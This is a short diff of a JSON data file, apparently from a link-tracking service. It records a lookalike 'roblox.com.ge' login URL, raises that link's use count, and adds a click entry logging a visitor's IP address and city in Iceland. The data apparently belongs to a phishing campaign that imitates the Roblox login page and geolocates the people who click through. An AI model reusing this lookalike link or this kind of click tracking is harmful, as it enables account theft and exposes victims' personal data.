@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 992,
+    "useCount": 993,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8051,6 +8051,14 @@
       },
       {
         "timestamp": 1777219687145,
+        "ip": "89.160.149.237",
+        "country": "Iceland",
+        "city": "Kopavogur",
+        "flag": "🇮🇸",
+        "countryCode": "IS"
+      },
+      {
+        "timestamp": 1777219708170,
         "ip": "89.160.149.237",
         "country": "Iceland",
         "city": "Kopavogur",
